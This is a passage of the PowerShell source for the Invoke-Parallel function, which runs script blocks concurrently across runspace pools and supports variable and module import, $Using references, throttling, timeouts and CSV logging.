        Inside the script block, $parameter is used to reference this parameter object.  This example sets a content file, gets content from that file, and sets it to a predefined log file.
    .EXAMPLE
        $test = 5
        1..2 | Invoke-Parallel -ImportVariables {$_ * $test}
        Add variables from the current session to the session state.  Without -ImportVariables $Test would not be accessible
    .EXAMPLE
        $test = 5
        1..2 | Invoke-Parallel {$_ * $Using:test}
        Reference a variable from the current session with the $Using:<Variable> syntax.  Requires PowerShell 3 or later. Note that -ImportVariables parameter is no longer necessary.
    .FUNCTIONALITY
        PowerShell Language
    .NOTES
        Credit to Boe Prox for the base runspace code and $Using implementation
            http://learn-powershell.net/2012/05/10/speedy-network-information-query-using-powershell/
            http://gallery.technet.microsoft.com/scriptcenter/Speedy-Network-Information-5b1406fb#content
            https://github.com/proxb/PoshRSJob/
        Credit to T Bryce Yehl for the Quiet and NoCloseOnTimeout implementations
        Credit to Sergei Vorobev for the many ideas and contributions that have improved functionality, reliability, and ease of use
    .LINK
        https://github.com/RamblingCookieMonster/Invoke-Parallel
    #>
    [cmdletbinding(DefaultParameterSetName='ScriptBlock')]
    Param (
        [Parameter(Mandatory=$false,position=0,ParameterSetName='ScriptBlock')]
        [System.Management.Automation.ScriptBlock]$ScriptBlock,

        [Parameter(Mandatory=$false,ParameterSetName='ScriptFile')]
        [ValidateScript({Test-Path $_ -pathtype leaf})]
        $ScriptFile,

        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [Alias('CN','__Server','IPAddress','Server','ComputerName')]
        [PSObject]$InputObject,

        [PSObject]$Parameter,

        [switch]$ImportVariables,
        [switch]$ImportModules,
        [switch]$ImportFunctions,

        [int]$Throttle = 20,
        [int]$SleepTimer = 200,
        [int]$RunspaceTimeout = 0,
        [switch]$NoCloseOnTimeout = $false,
        [int]$MaxQueue,

        [validatescript({Test-Path (Split-Path $_ -parent)})]
        [switch] $AppendLog = $false,
        [string]$LogFile,

        [switch] $Quiet = $false
    )
    begin {
        #No max queue specified?  Estimate one.
        #We use the script scope to resolve an odd PowerShell 2 issue where MaxQueue isn't seen later in the function
        if( -not $PSBoundParameters.ContainsKey('MaxQueue') ) {
            if($RunspaceTimeout -ne 0){ $script:MaxQueue = $Throttle }
            else{ $script:MaxQueue = $Throttle * 3 }
        }
        else {
            $script:MaxQueue = $MaxQueue
        }
        #Write-Verbose "Throttle: '$throttle' SleepTimer '$sleepTimer' runSpaceTimeout '$runspaceTimeout' maxQueue '$maxQueue' logFile '$logFile'"

        #If they want to import variables or modules, create a clean runspace, get loaded items, use those to exclude items
        if ($ImportVariables -or $ImportModules -or $ImportFunctions) {
            $StandardUserEnv = [powershell]::Create().addscript({

                #Get modules, snapins, functions in this clean runspace
                $Modules = Get-Module | Select-Object -ExpandProperty Name
                $Snapins = Get-PSSnapin | Select-Object -ExpandProperty Name
                $Functions = Get-ChildItem function:\ | Select-Object -ExpandProperty Name

                #Get variables in this clean runspace
                #Called last to get vars like $? into session
                $Variables = Get-Variable | Select-Object -ExpandProperty Name

                #Return a hashtable where we can access each.
                @{
                    Variables   = $Variables
                    Modules     = $Modules
                    Snapins     = $Snapins
                    Functions   = $Functions
                }
            }).invoke()[0]

            if ($ImportVariables) {
                #Exclude common parameters, bound parameters, and automatic variables
                Function _temp {[cmdletbinding(SupportsShouldProcess=$True)] param() }
                $VariablesToExclude = @( (Get-Command _temp | Select-Object -ExpandProperty parameters).Keys + $PSBoundParameters.Keys + $StandardUserEnv.Variables )
                #Write-Verbose "Excluding variables $( ($VariablesToExclude | Sort-Object ) -join ", ")"

                # we don't use 'Get-Variable -Exclude', because it uses regexps.
                # One of the veriables that we pass is '$?'.
                # There could be other variables with such problems.
                # Scope 2 required if we move to a real module
                $UserVariables = @( Get-Variable | Where-Object { -not ($VariablesToExclude -contains $_.Name) } )
                #Write-Verbose "Found variables to import: $( ($UserVariables | Select-Object -expandproperty Name | Sort-Object ) -join ", " | Out-String).`n"
            }
            if ($ImportModules) {
                $UserModules = @( Get-Module | Where-Object {$StandardUserEnv.Modules -notcontains $_.Name -and (Test-Path $_.Path -ErrorAction SilentlyContinue)} | Select-Object -ExpandProperty Path )
                $UserSnapins = @( Get-PSSnapin | Select-Object -ExpandProperty Name | Where-Object {$StandardUserEnv.Snapins -notcontains $_ } )
            }
            if($ImportFunctions) {
                $UserFunctions = @( Get-ChildItem function:\ | Where-Object { $StandardUserEnv.Functions -notcontains $_.Name } )
            }
        }

        #region functions
            Function Get-RunspaceData {
                [cmdletbinding()]
                param( [switch]$Wait )
                #loop through runspaces
                #if $wait is specified, keep looping until all complete
                Do {
                    #set more to false for tracking completion
                    $more = $false

                    #Progress bar if we have inputobject count (bound parameter)
                    if (-not $Quiet) {
                        Write-Progress  -Activity "Running Query" -Status "Starting threads"`
                            -CurrentOperation "$startedCount threads defined - $totalCount input objects - $script:completedCount input objects processed"`
                            -PercentComplete $( Try { $script:completedCount / $totalCount * 100 } Catch {0} )
                    }

                    #run through each runspace.
                    Foreach($runspace in $runspaces) {

                        #get the duration - inaccurate
                        $currentdate = Get-Date
                        $runtime = $currentdate - $runspace.startTime
                        $runMin = [math]::Round( $runtime.totalminutes ,2 )

                        #set up log object
                        $log = "" | Select-Object Date, Action, Runtime, Status, Details
                        $log.Action = "Removing:'$($runspace.object)'"
                        $log.Date = $currentdate
                        $log.Runtime = "$runMin minutes"

                        #If runspace completed, end invoke, dispose, recycle, counter++
                        If ($runspace.Runspace.isCompleted) {

                            $script:completedCount++

                            #check if there were errors
                            if($runspace.powershell.Streams.Error.Count -gt 0) {
                                #set the logging info and move the file to completed
                                $log.status = "CompletedWithErrors"
                                #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                                foreach($ErrorRecord in $runspace.powershell.Streams.Error) {
                                    Write-Error -ErrorRecord $ErrorRecord
                                }
                            }
                            else {
                                #add logging details and cleanup
                                $log.status = "Completed"
                                #Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                            }

                            #everything is logged, clean up the runspace
                            $runspace.powershell.EndInvoke($runspace.Runspace)
                            $runspace.powershell.dispose()
                            $runspace.Runspace = $null
                            $runspace.powershell = $null
                        }
                        #If runtime exceeds max, dispose the runspace
                        ElseIf ( $runspaceTimeout -ne 0 -and $runtime.totalseconds -gt $runspaceTimeout) {
                            $script:completedCount++
                            $timedOutTasks = $true

                            #add logging details and cleanup
                            $log.status = "TimedOut"
                            Write-Verbose ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1]
                            Write-Error "Runspace timed out at $($runtime.totalseconds) seconds for the object:`n$($runspace.object | out-string)"

                            #Depending on how it hangs, we could still get stuck here as dispose calls a synchronous method on the powershell instance
                            if (!$noCloseOnTimeout) { $runspace.powershell.dispose() }
                            $runspace.Runspace = $null
                            $runspace.powershell = $null
                            $completedCount++
                        }

                        #If runspace isn't null set more to true
                        ElseIf ($runspace.Runspace -ne $null ) {
                            $log = $null
                            $more = $true
                        }

                        #log the results if a log file was indicated
                        if($logFile -and $log) {
                            ($log | ConvertTo-Csv -Delimiter ";" -NoTypeInformation)[1] | out-file $LogFile -append
                        }
                    }

                    #Clean out unused runspace jobs
                    $temphash = $runspaces.clone()
                    $temphash | Where-Object { $_.runspace -eq $Null } | ForEach-Object {
                        $Runspaces.remove($_)
                    }

                    #sleep for a bit if we will loop again
                    if($PSBoundParameters['Wait']){ Start-Sleep -milliseconds $SleepTimer }

                #Loop again only if -wait parameter and there are more runspaces to process
                } while ($more -and $PSBoundParameters['Wait'])

            #End of runspace function
            }
        #endregion functions

        #region Init

            if($PSCmdlet.ParameterSetName -eq 'ScriptFile') {
                $ScriptBlock = [scriptblock]::Create( $(Get-Content $ScriptFile | out-string) )
            }
            elseif($PSCmdlet.ParameterSetName -eq 'ScriptBlock') {
                #Start building parameter names for the param block
                [string[]]$ParamsToAdd = '$_'
                if( $PSBoundParameters.ContainsKey('Parameter') ) {
                    $ParamsToAdd += '$Parameter'
                }

                $UsingVariableData = $Null

                # This code enables $Using support through the AST.
                # This is entirely from  Boe Prox, and his https://github.com/proxb/PoshRSJob module; all credit to Boe!

                if($PSVersionTable.PSVersion.Major -gt 2) {
                    #Extract using references
                    $UsingVariables = $ScriptBlock.ast.FindAll({$args[0] -is [System.Management.Automation.Language.UsingExpressionAst]},$True)

                    If ($UsingVariables) {
                        $List = New-Object 'System.Collections.Generic.List`1[System.Management.Automation.Language.VariableExpressionAst]'
                        ForEach ($Ast in $UsingVariables) {
                            [void]$list.Add($Ast.SubExpression)
                        }

                        $UsingVar = $UsingVariables | Group-Object -Property SubExpression | ForEach-Object {$_.Group | Select-Object -First 1}

                        #Extract the name, value, and create replacements for each
                        $UsingVariableData = ForEach ($Var in $UsingVar) {
                            try {
                                $Value = Get-Variable -Name $Var.SubExpression.VariablePath.UserPath -ErrorAction Stop
                                [pscustomobject]@{
                                    Name = $Var.SubExpression.Extent.Text
                                    Value = $Value.Value
                                    NewName = ('$__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                                    NewVarName = ('__using_{0}' -f $Var.SubExpression.VariablePath.UserPath)
                                }
                            }
                            catch {
                                Write-Error "$($Var.SubExpression.Extent.Text) is not a valid Using: variable!"
                            }
                        }
                        $ParamsToAdd += $UsingVariableData | Select-Object -ExpandProperty NewName -Unique

                        $NewParams = $UsingVariableData.NewName -join ', '
                        $Tuple = [Tuple]::Create($list, $NewParams)
                        $bindingFlags = [Reflection.BindingFlags]"Default,NonPublic,Instance"
                        $GetWithInputHandlingForInvokeCommandImpl = ($ScriptBlock.ast.gettype().GetMethod('GetWithInputHandlingForInvokeCommandImpl',$bindingFlags))

                        $StringScriptBlock = $GetWithInputHandlingForInvokeCommandImpl.Invoke($ScriptBlock.ast,@($Tuple))

                        $ScriptBlock = [scriptblock]::Create($StringScriptBlock)

                        Write-Verbose $StringScriptBlock
                    }
                }

                $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock("param($($ParamsToAdd -Join ", "))`r`n" + $Scriptblock.ToString())
            }
            else {
                Throw "Must provide ScriptBlock or ScriptFile"; Break
            }

            Write-Debug "`$ScriptBlock: $($ScriptBlock | Out-String)"
            Write-Verbose "Creating runspace pool and session states"

            #If specified, add variables and modules/snapins to session state
            $sessionstate = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
            if($ImportVariables -and $UserVariables.count -gt 0) {
                foreach($Variable in $UserVariables) {
                    $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Variable.Name, $Variable.Value, $null) )
                }
            }
            if ($ImportModules) {
                if($UserModules.count -gt 0) {
                    foreach($ModulePath in $UserModules) {
                        $sessionstate.ImportPSModule($ModulePath)
                    }
                }
                if($UserSnapins.count -gt 0) {
                    foreach($PSSnapin in $UserSnapins) {
                        [void]$sessionstate.ImportPSSnapIn($PSSnapin, [ref]$null)
                    }
                }
            }
            if($ImportFunctions -and $UserFunctions.count -gt 0) {
                foreach ($FunctionDef in $UserFunctions) {
                    $sessionstate.Commands.Add((New-Object System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $FunctionDef.Name,$FunctionDef.ScriptBlock))
                }
            }

            #Create runspace pool
            $runspacepool = [runspacefactory]::CreateRunspacePool(1, $Throttle, $sessionstate, $Host)
            $runspacepool.Open()

            Write-Verbose "Creating empty collection to hold runspace jobs"
            $Script:runspaces = New-Object System.Collections.ArrayList

            #If inputObject is bound get a total count and set bound to true
            $bound = $PSBoundParameters.keys -contains "InputObject"
            if(-not $bound) {
                [System.Collections.ArrayList]$allObjects = @()
            }

            #Set up log file if specified
            if( $LogFile -and (-not (Test-Path $LogFile) -or $AppendLog -eq $false)){
                New-Item -ItemType file -Path $logFile -Force | Out-Null
                ("" | Select-Object -Property Date, Action, Runtime, Status, Details | ConvertTo-Csv -NoTypeInformation -Delimiter ";")[0] | Out-File $LogFile
            }

            #write initial log entry
            $log = "" | Select-Object -Property Date, Action, Runtime, Status, Details
                $log.Date = Get-Date
                $log.Action = "Batch processing started"
                $log.Runtime = $null
                $log.Status = "Started"
                $log.Details = $null
                if($logFile) {
                    ($log | convertto-csv -Delimiter ";" -NoTypeInformation)[1] | Out-File $LogFile -Append
                }
            $timedOutTasks = $false
        #endregion INIT
    }
    process {
        #add piped objects to all objects or set all objects to bound input object parameter
        if($bound) {
            $allObjects = $InputObject
        }
        else {
            [void]$allObjects.add( $InputObject )
        }
    }
    end {
        #Use Try/Finally to catch Ctrl+C and clean up.
        try {
            #counts for progress
            $totalCount = $allObjects.count
            $script:completedCount = 0
            $startedCount = 0
            foreach($object in $allObjects) {
                #region add scripts to runspace pool
                    #Create the powershell instance, set verbose if needed, supply the scriptblock and parameters
                    $powershell = [powershell]::Create()

                    if ($VerbosePreference -eq 'Continue') {
                        [void]$PowerShell.AddScript({$VerbosePreference = 'Continue'})
                    }

                    [void]$PowerShell.AddScript($ScriptBlock).AddArgument($object)

                    if ($parameter) {
                        [void]$PowerShell.AddArgument($parameter)
                    }

                    # $Using support from Boe Prox
                    if ($UsingVariableData) {
                        Foreach($UsingVariable in $UsingVariableData) {
                            #Write-Verbose "Adding $($UsingVariable.Name) with value: $($UsingVariable.Value)"
                            [void]$PowerShell.AddArgument($UsingVariable.Value)
                        }
                    }

                    #Add the runspace into the powershell instance
                    $powershell.RunspacePool = $runspacepool

                    #Create a temporary collection for each runspace
                    $temp = "" | Select-Object PowerShell, StartTime, object, Runspace
                    $temp.PowerShell = $powershell
                    $temp.StartTime = Get-Date
                    $temp.object = $object

                    #Save the handle output when calling BeginInvoke() that will be used later to end the runspace
                    $temp.Runspace = $powershell.BeginInvoke()
                    $startedCount++

                    #Add the temp tracking info to $runspaces collection
                    #Write-Verbose ( "Adding {0} to collection at {1}" -f $temp.object, $temp.starttime.tostring() )
                    $runspaces.Add($temp) | Out-Null

                    #loop through existing runspaces one time
                    Get-RunspaceData

                    #If we have more running than max queue (used to control timeout accuracy)
                    #Script scope resolves odd PowerShell 2 issue
                    $firstRun = $true
                    while ($runspaces.count -ge $Script:MaxQueue) {
                        #give verbose output
                        if($firstRun) {
                            #Write-Verbose "$($runspaces.count) items running - exceeded $Script:MaxQueue limit."
                        }
                        $firstRun = $false

                        #run get-runspace data and sleep for a short while
                        Get-RunspaceData
                        Start-Sleep -Milliseconds $sleepTimer
                    }
                #endregion add scripts to runspace pool
            }
            Write-Verbose ( "Finish processing the remaining runspace jobs: {0}" -f ( @($runspaces | Where-Object {$_.Runspace -ne $Null}).Count) )

            Get-RunspaceData -wait
            if (-not $quiet) {
                Write-Progress -Activity "Running Query" -Status "Starting threads" -Completed
            }
        }
        finally {
            #Close the runspace pool, unless we specified no close on timeout and something timed out
            if ( ($timedOutTasks -eq $false) -or ( ($timedOutTasks -eq $true) -and ($noCloseOnTimeout -eq $false) ) ) {
                Write-Verbose "Closing the runspace pool"
                $runspacepool.close()
            }
            #collect garbage
            [gc]::Collect()
        }
    }
}
